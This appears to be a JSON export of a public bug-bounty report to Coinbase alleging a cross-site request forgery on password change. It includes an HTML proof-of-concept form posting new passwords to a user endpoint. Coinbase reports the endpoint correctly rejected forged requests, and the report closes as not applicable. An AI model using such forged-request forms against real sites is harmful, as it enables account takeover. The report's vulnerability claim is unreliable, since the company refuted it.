{"id":230436,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzA0MzY=","url":"https://hackerone.com/reports/230436","title":"CSRF bug on password change","state":"Closed","substate":"not-applicable","readable_substate":"N/A","created_at":"2017-05-21T10:36:04.166Z","submitted_at":"2017-05-21T10:36:04.166Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dark_heaven","url":"/dark_heaven","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/154/935/5f618f48ba808be6d0258844f8d8922dad9c86eb_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":104,"url":"https://hackerone.com/coinbase","handle":"coinbase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/104/b151e01a4adbf5ad9067fc30fb2dfe5d5997fa5c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/104/b151e01a4adbf5ad9067fc30fb2dfe5d5997fa5c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Coinbase","twitter_handle":"","website":"https://coinbase.com/security","about":"Creating an open financial system for the world"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-08-28T17:39:14.683Z","bug_reporter_agreed_on_going_public_at":"2017-08-28T10:50:57.570Z","team_member_agreed_on_going_public_at":"2017-08-28T17:39:14.652Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, researchers are more likely to earn a larger bounty by explaining how a vulnerability can be exploited to cause harm to Coinbase or its users.\n\n**Summary:** Attacker can change password without user permission\n\n**Description:**HI I found csrf bug on password changing session. It can be dangerous for user. Cause attacker can change password with out user permission. CSRF POC is below :-\n\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://www.coinbase.com/users/59215b8f0ec7c37a4ca27b00/password_reset\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"utf8\" value=\"â\u0026#156;\u0026#147;\" /\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;method\" value=\"patch\" /\u003e\n      \u003cinput type=\"hidden\" name=\"old\u0026#95;password\" value=\"dadaboji1\" /\u003e\n      \u003cinput type=\"hidden\" name=\"password\" value=\"dadaboji\" /\u003e\n      \u003cinput type=\"hidden\" name=\"password\u0026#95;confirmation\" value=\"dadaboji\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n\n## Browsers Verified In:\n\n  * [firefox 45.9.0]\n  * [add each browser and version number tested in]\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. [Intercept with burpsuite. After change password click]\n  1. [Make CSRF POC with burpsuite]\n  1. [change data]\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)","vulnerability_information_html":"\u003cblockquote\u003e\n\u003cp\u003eNOTE! Thanks for submitting a report! Please replace \u003cem\u003eall\u003c/em\u003e the [square] sections below with the pertinent details. Remember, researchers are more likely to earn a larger bounty by explaining how a vulnerability can be exploited to cause harm to Coinbase or its users.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e Attacker can change password without user permission\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003eHI I found csrf bug on password changing session. It can be dangerous for user. Cause attacker can change password with out user permission. CSRF POC is below :-\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;https://www.coinbase.com/users/59215b8f0ec7c37a4ca27b00/password_reset\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;utf8\u0026quot; value=\u0026quot;â\u0026amp;#156;\u0026amp;#147;\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;\u0026amp;#95;method\u0026quot; value=\u0026quot;patch\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;old\u0026amp;#95;password\u0026quot; value=\u0026quot;dadaboji1\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;password\u0026quot; value=\u0026quot;dadaboji\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;password\u0026amp;#95;confirmation\u0026quot; value=\u0026quot;dadaboji\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003ch2 id=\"browsers-verified-in\"\u003eBrowsers Verified In:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e[firefox 45.9.0]\u003c/li\u003e\n\u003cli\u003e[add each browser and version number tested in]\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003e(Add details for how we can reproduce the issue)\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e[Intercept with burpsuite. After change password click]\u003c/li\u003e\n\u003cli\u003e[Make CSRF POC with burpsuite]\u003c/li\u003e\n\u003cli\u003e[change data]\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eList any additional material (e.g. screenshots, logs, etc.)\u003c/li\u003e\n\u003c/ul\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1773248,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We're investigating this, we appreciate your report and your patience, thanks!\n\nRegards,\nThe Coinbase Team","markdown_message":"\u003cp\u003eWe\u0026#39;re investigating this, we appreciate your report and your patience, thanks!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nThe Coinbase Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-22T02:00:21.262Z","updated_at":"2017-06-22T02:00:21.262Z","actor":{"username":"coinbaseh1user","cleared":false,"url":"/coinbaseh1user","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"coinbase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1792877,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"I was not able to reproduce this issue, when I submit a password change form with a missing or invalid CSRF parameter to password change does not occur.\n\nCould you verify?\nRegards,\nThe Coinbase Team","markdown_message":"\u003cp\u003eI was not able to reproduce this issue, when I submit a password change form with a missing or invalid CSRF parameter to password change does not occur.\u003c/p\u003e\n\n\u003cp\u003eCould you verify?\u003cbr\u003e\nRegards,\u003cbr\u003e\nThe Coinbase Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-29T23:03:36.130Z","updated_at":"2017-06-29T23:03:36.130Z","actor":{"username":"coinbaseh1user","cleared":false,"url":"/coinbaseh1user","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"coinbase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1856730,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Sorry for late reply I could n't produce that again. May be I did mistake Sorry for that. \nIf i found any other bug i will inform you  thanks","markdown_message":"\u003cp\u003eSorry for late reply I could n\u0026#39;t produce that again. May be I did mistake Sorry for that. \u003cbr\u003e\nIf i found any other bug i will inform you  thanks\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-21T15:16:47.497Z","updated_at":"2017-07-21T15:16:47.497Z","actor":{"username":"dark_heaven","cleared":false,"url":"/dark_heaven","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/935/5f618f48ba808be6d0258844f8d8922dad9c86eb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"coinbase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1857093,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"Thanks for verifying and for your report.\n\nRegards,\nThe Coinbase Team","markdown_message":"\u003cp\u003eThanks for verifying and for your report.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nThe Coinbase Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-21T17:31:56.563Z","updated_at":"2017-07-21T17:31:56.563Z","actor":{"username":"coinbaseh1user","cleared":false,"url":"/coinbaseh1user","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"coinbase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1959328,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-28T10:50:57.587Z","updated_at":"2017-08-28T10:50:57.587Z","first_to_agree":true,"actor":{"username":"dark_heaven","cleared":false,"url":"/dark_heaven","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/154/935/5f618f48ba808be6d0258844f8d8922dad9c86eb_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"coinbase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1960807,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-28T17:39:14.667Z","updated_at":"2017-08-28T17:39:14.667Z","actor":{"username":"coinbaseh1user","cleared":false,"url":"/coinbaseh1user","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"coinbase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1960808,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-28T17:39:14.697Z","updated_at":"2017-08-28T17:39:14.697Z","actor":{"username":"coinbaseh1user","cleared":false,"url":"/coinbaseh1user","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"coinbase","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":5202,"category":"team","content":"There was not CSRF, the endpoint was correctly responding to the invalid request.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThere was not CSRF, the endpoint was correctly responding to the invalid request.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}